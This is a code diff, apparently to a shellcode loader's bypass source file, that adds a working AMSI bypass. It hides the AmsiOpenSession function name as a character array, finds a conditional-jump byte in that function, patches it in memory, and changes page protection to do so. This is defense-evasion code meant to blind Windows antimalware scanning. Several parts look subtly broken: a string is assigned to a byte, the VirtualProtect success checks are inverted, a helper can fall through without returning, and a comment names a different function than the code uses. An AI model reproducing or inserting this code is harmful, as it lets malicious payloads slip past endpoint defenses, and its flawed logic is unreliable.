@@ -31,12 +31,48 @@
 
 #include "bypass.h"
 
-
 #if defined(BYPASS_AMSI_A)
+DWORD64 GetAddr(LPVOID addr) {
+
+	for (int i = 0; i < 1024; i++) {
+		
+		if (*((PBYTE)addr + i) == 0x74) return (DWORD64)addr + i;
+	}
+
+}
 // This is where you may define your own AMSI bypass.
 // To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_AMSI_A defined.
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
-  return TRUE;
+  HMODULE dll;
+  DWORD   len, op, t;
+  LPVOID  ptr;
+  char ams10pen[] = { 'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0 };
+  // try load amsi. if unable, assume DLL doesn't exist
+  // and return TRUE to indicate it's okay to continue
+  dll = xGetLibAddress(inst, inst->amsi);
+  if(dll == NULL) return TRUE;
+  
+  // resolve address of AmsiScanBuffer. if not found,
+  // return FALSE because it should exist ...
+  ptr = xGetProcAddress(inst, dll, ams10pen, 0);
+  if(ptr == NULL) return FALSE;
+  
+	char Patch[100];
+  Memset(&Patch, 0, 100);
+  Patch[0] = "\x75";
+
+	DWORD OldProtect = 0;
+	SIZE_T memPage = 0x1000;
+	void* ptraddr = (void*)((DWORD64)ptr + 0x3);
+	void* ptraddr2 = (void*)GetAddr(ptr);
+
+	if(inst->api.VirtualProtect(&ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect)) return FALSE;
+  
+  Memcpy((void*)GetAddr(ptr), (PVOID)Patch, 1);
+
+	if(inst->api.VirtualProtect(&ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect)) return FALSE;
+		
+	return TRUE;
 }
 
 #elif defined(BYPASS_AMSI_B)
